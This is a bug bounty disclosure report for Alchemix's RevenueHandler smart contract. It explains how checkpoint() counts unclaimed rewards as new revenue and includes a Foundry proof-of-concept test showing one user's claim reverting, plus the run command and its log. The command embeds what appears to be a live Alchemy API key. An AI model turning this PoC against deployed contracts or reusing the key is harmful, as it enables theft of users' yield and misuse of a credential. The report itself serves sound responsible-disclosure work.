# 31263 - \[SC - Critical] RevenueHandlercheckpoint counts unclaimed rewar...

Submitted on May 15th 2024 at 22:47:08 UTC by @yttriumzz for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31263

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

Anyone calls `RevenueHandler.checkpoint` to update the reward for the current epoch. `checkpoint` will calculate the reward based on the reward token balance of the contract. However, these balances include unclaimed rewards. In other words, the unclaimed rewards of some users are included in the rewards of the new epoch.

## Vulnerability Details

Please look at the following code. When `tokenConfig.poolAdapter` is not set, `thisBalance` is directly used as the reward for the new epoch.

```solidity
///// https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/RevenueHandler.sol#L245-L264
                uint256 thisBalance = IERC20(token).balanceOf(address(this));

                // If poolAdapter is set, the revenue token is an alchemic-token
                if (tokenConfig.poolAdapter != address(0)) {
                    // Treasury only receives revenue if the token is an alchemic-token
                    treasuryAmt = (thisBalance * treasuryPct) / BPS;
                    IERC20(token).safeTransfer(treasury, treasuryAmt);

                    // Only melt if there is an alchemic-token to melt to
                    amountReceived = _melt(token);

                    // Update amount of alchemic-token revenue received for this epoch
                    epochRevenues[currentEpoch][tokenConfig.debtToken] += amountReceived;
                } else {
                    // If the revenue token doesn't have a poolAdapter, it is not an alchemic-token
                    amountReceived = thisBalance;

                    // Update amount of non-alchemic-token revenue received for this epoch
                    epochRevenues[currentEpoch][token] += amountReceived;
                }
```

**Suggested fix**

Record the balance as a reward instead of using all the balance directly

## Impact Details

Users who claim rewards every epoch will receive more rewards, and other users will receive less rewards

## References

None

## Proof of concept

The PoC patch

```diff
diff --git a/src/test/RevenueHandler.t.sol b/src/test/RevenueHandler.t.sol
index 7908478..fd9cbe6 100644
--- a/src/test/RevenueHandler.t.sol
+++ b/src/test/RevenueHandler.t.sol
@@ -644,4 +644,58 @@ contract RevenueHandlerTest is BaseTest {
         revenueHandler.setTreasury(admin);
         assertEq(revenueHandler.treasury(), admin, "treasury should be admin");
     }
+
+    function testYttriumzzPocTemp() external {
+        // 1. init test env
+        deal(bal, address(this), 10000e18);
+        veALCX.checkpoint();
+
+        address user1 = address(0xacc1);
+        address user2 = address(0xacc2);
+        deal(bpt, user1, 1e18);
+        deal(bpt, user2, 1e18);
+
+        // 2. user1 and user2 mint $veToken with 1e18 BPT
+        hevm.startPrank(user1);
+        IERC20(bpt).approve(address(veALCX), 1e18);
+        uint256 tokenId1 = veALCX.createLock(1e18, 0, true);
+        hevm.stopPrank();
+
+        hevm.startPrank(user2);
+        IERC20(bpt).approve(address(veALCX), 1e18);
+        uint256 tokenId2 = veALCX.createLock(1e18, 0, true);
+        hevm.stopPrank();
+
+        vm.warp(block.timestamp + 2 weeks);
+        veALCX.checkpoint();
+
+        // 3. checkpoint 1, user1 claim the rewards
+        IERC20(bal).transfer(address(revenueHandler), 100e18);
+        revenueHandler.checkpoint();
+        vm.warp(block.timestamp + 2 weeks);
+
+        hevm.startPrank(user1);
+        revenueHandler.claim(tokenId1, bal, address(0), revenueHandler.claimable(tokenId1, bal), user1);
+        hevm.stopPrank();
+
+        // 4. checkpoint 2, user1 and user2 claim the rewards, user2 claim revert
+        IERC20(bal).transfer(address(revenueHandler), 100e18);
+        revenueHandler.checkpoint();
+        vm.warp(block.timestamp + 2 weeks);
+
+        hevm.startPrank(user1);
+        revenueHandler.claim(tokenId1, bal, address(0), revenueHandler.claimable(tokenId1, bal), user1);
+        hevm.stopPrank();
+
+        hevm.startPrank(user2);
+        uint256 toClaimable = revenueHandler.claimable(tokenId2, bal);
+        hevm.expectRevert("Not enough revenue to claim");
+        revenueHandler.claim(tokenId2, bal, address(0), toClaimable, user2);
+        console.log("claimable of user2 is %s, but revert", toClaimable);
+        hevm.stopPrank();
+
+        console.log("IERC20(bal).balanceOf(user1): %s", IERC20(bal).balanceOf(user1));
+        console.log("IERC20(bal).balanceOf(user2): %s", IERC20(bal).balanceOf(user2));
+        console.log("IERC20(bal).balanceOf(address(revenueHandler)): %s", IERC20(bal).balanceOf(address(revenueHandler)));
+    }
 }
```

Run the PoC

```bash
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
```

The log

```bash
$ FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/RevenueHandler.t.sol:RevenueHandlerTest
[PASS] testYttriumzzPocTemp() (gas: 3021917)
Logs:
  claimable of user2 is 125000000000000000000, but revert
  IERC20(bal).balanceOf(user1): 125000000000000000000
  IERC20(bal).balanceOf(user2): 0
  IERC20(bal).balanceOf(address(revenueHandler)): 75000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 35.59ms (19.80ms CPU time)

Ran 1 test suite in 1.81s (35.59ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
